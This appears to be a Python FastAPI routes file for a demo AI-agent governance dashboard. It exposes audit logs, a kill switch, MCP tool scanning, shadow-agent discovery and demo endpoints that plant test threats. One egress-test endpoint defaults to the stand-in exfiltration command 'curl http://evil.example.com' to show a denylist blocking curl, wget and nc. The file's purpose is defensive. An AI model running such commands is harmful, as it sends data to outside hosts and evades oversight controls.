# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.
"""Governance routes — the data behind the React Agent Governance page.

Exposes the complete agent history: roster, decisions, audit trail (with
integrity verification), and per-agent trust history. Plus the kill switch.
"""

from __future__ import annotations

from fastapi import APIRouter, HTTPException, Query

from app.governance.demo_controls import demo_controls
from app.governance.discovery import discovery
from app.governance.gate import gate
from app.governance.killswitch import killswitch
from app.governance.marketplace import marketplace
from app.governance.mcp_security import mcp_security
from app.governance.reliability import reliability
from app.governance.rings import rings
from app.store import db

router = APIRouter(prefix="/api/governance", tags=["governance"])


@router.get("/agents")
def agents() -> dict:
    """Agent roster: DID, role, ring, status, trust score + tier, capabilities."""
    return {"items": db.list_agents()}


@router.get("/decisions")
def decisions(
    limit: int = Query(100, ge=1, le=1000),
    agent_did: str | None = Query(None),
) -> dict:
    """Decision history (allow/deny/require_approval), newest first."""
    return {"items": db.list_decisions(limit=limit, agent_did=agent_did)}


@router.get("/audit")
def audit(
    limit: int = Query(200, ge=1, le=2000),
    agent_did: str | None = Query(None),
) -> dict:
    """Tamper-evident audit entries, newest first."""
    return {"items": db.list_audit(limit=limit, agent_did=agent_did)}


@router.get("/audit/verify")
def audit_verify() -> dict:
    """Verify the in-memory hash-chain integrity of the audit log."""
    ok, err = gate.verify_audit()
    return {"ok": ok, "error": err}


@router.get("/trust/{agent_did:path}")
def trust(agent_did: str, limit: int = Query(100, ge=1, le=1000)) -> dict:
    """Trust-score history for one agent (for the trust chart)."""
    return {"agent_did": agent_did, "items": db.trust_history(agent_did, limit=limit)}


@router.post("/kill/{agent_did:path}")
def kill(agent_did: str) -> dict:
    """Kill switch — terminate an agent via the real AGT KillSwitch."""
    agents = {a["did"]: a for a in db.list_agents()}
    if agent_did not in agents:
        raise HTTPException(404, "unknown agent")
    result = killswitch.kill(
        agent_did, agent_name=agents[agent_did]["name"], reason="manual",
        details="killed from governance dashboard",
    )
    return {"agent_did": agent_did, "status": "suspended", **result}


@router.post("/reactivate/{agent_did:path}")
def reactivate(agent_did: str) -> dict:
    """Re-activate a suspended agent (demo convenience)."""
    agents = {a["did"]: a for a in db.list_agents()}
    if agent_did not in agents:
        raise HTTPException(404, "unknown agent")
    db.set_agent_status(agent_did, "active")
    return {"agent_did": agent_did, "status": "active"}


# ── MCP tool security (Phase 2) ──────────────────────────────────────────────
@router.get("/mcp/scans")
def mcp_scans() -> dict:
    """Latest MCP tool security scan verdicts (poisoning / typosquat / rug-pull)."""
    return {"items": db.list_mcp_scans()}


@router.post("/mcp/scan")
def mcp_rescan() -> dict:
    """Re-scan the MCP tool catalog on demand."""
    results = mcp_security.scan_catalog()
    return {"scanned": len(results), "items": db.list_mcp_scans()}


# ── Runtime hardening (Phase 3): rings, breakers, kills, events ──────────────
@router.get("/rings")
def rings_table() -> dict:
    """Per-agent execution ring + resource constraints."""
    return {"items": rings.ring_table()}


@router.get("/breakers")
def breakers() -> dict:
    """Per-agent circuit breaker state + SLO success rate."""
    return {"items": reliability.states()}


@router.post("/breakers/{agent_key}/reset")
def reset_breaker(agent_key: str) -> dict:
    """Reset an agent's circuit breaker (demo convenience)."""
    reliability.reset(agent_key)
    return {"agent_key": agent_key, "reset": True}


@router.get("/kills")
def kills() -> dict:
    """Kill history from the AGT kill switch."""
    return {"items": killswitch.kill_history()}


@router.get("/runtime/events")
def runtime_events(limit: int = Query(200, ge=1, le=2000), kind: str | None = Query(None)) -> dict:
    """Runtime events: ring denials, command denials, breaker trips, kills."""
    return {"items": db.list_runtime_events(limit=limit, kind=kind)}


# ── Advisory layer (Phase 4) ─────────────────────────────────────────────────
@router.get("/advisory")
def advisory(limit: int = Query(100, ge=1, le=1000)) -> dict:
    """Trades the probabilistic advisory layer flagged or blocked after a
    deterministic allow (non-deterministic opinions; never loosen a deny)."""
    return {"items": db.list_advisory(limit=limit)}


# ── Shadow discovery (Phase 5) ───────────────────────────────────────────────
@router.get("/discovery/shadows")
def discovery_shadows() -> dict:
    """Discovered agents + reconciliation status (shadow vs registered) + risk."""
    return {"items": db.list_shadow_agents()}


@router.post("/discovery/scan")
def discovery_scan() -> dict:
    """Re-run a discovery + reconciliation + risk-scoring pass."""
    summary = discovery.scan()
    return {"summary": summary, "items": db.list_shadow_agents()}


# ── Marketplace vetting (Phase 5) ────────────────────────────────────────────
@router.get("/marketplace")
def marketplace_vettings() -> dict:
    """MCP tools vetted as plugins: trust tier, quality, signing status."""
    return {"items": db.list_plugin_vettings()}


@router.post("/marketplace/vet")
def marketplace_vet() -> dict:
    """Re-vet the MCP tool catalog on demand."""
    results = marketplace.vet_catalog()
    return {"vetted": len(results), "items": db.list_plugin_vettings()}


# ── Governed intake + RAG (Phase 6) ──────────────────────────────────────────
@router.get("/intake")
def intake_events(limit: int = Query(50, ge=1, le=500)) -> dict:
    """Recent governed-intake events: PII redactions, injection verdicts, resolved symbols."""
    return {"items": db.list_intake_events(limit=limit)}


@router.get("/rag")
def rag_retrievals(limit: int = Query(50, ge=1, le=500)) -> dict:
    """Recent annual-report RAG retrievals: report, chunks used, chunks flagged for injection."""
    return {"items": db.list_rag_retrievals(limit=limit)}


@router.post("/runtime/egress-test/{agent_key}")
def egress_test(agent_key: str, command: str = Query("curl http://evil.example.com")) -> dict:
    """Demo: have an agent attempt a shell command → command denylist check.

    Shows the denylist structurally blocking an exfiltration attempt
    (curl/wget/nc/etc.). Records a runtime event on denial.
    """
    agents = {a["name"]: a for a in db.list_agents()}
    # Resolve agent by key via identities for did/name.
    from app.governance.identities import get_agent

    try:
        agent = get_agent(agent_key)
    except KeyError:
        raise HTTPException(404, "unknown agent")
    allowed, reason = rings.check_command(command, agent_did=agent.did, agent_name=agent.name)
    return {"agent": agent_key, "command": command, "allowed": allowed, "reason": reason}


# ── DEMO threat-injection controls (presenter tooling) ───────────────────────
# These endpoints plant threats so the EXISTING scanners catch them on the
# Agent Governance page. They are explicit demo tooling, not real governance.
@router.post("/demo/mcp-tool")
def demo_add_mcp_tool() -> dict:
    """Inject a poisoned MCP tool, then re-scan + re-vet (block + revoke)."""
    return demo_controls.add_risky_mcp_tool()


@router.post("/demo/shadow-agent")
def demo_add_shadow_agent() -> dict:
    """Inject a rogue ungoverned agent, then re-scan discovery (shadow)."""
    return demo_controls.add_harmful_agent()


@router.post("/demo/tamper-audit")
def demo_tamper_audit() -> dict:
    """Corrupt one audit entry so integrity verification fails."""
    return demo_controls.tamper_audit()


@router.post("/demo/reset")
def demo_reset() -> dict:
    """Clear injected threats + repair the audit chain to the clean baseline."""
    return demo_controls.reset()
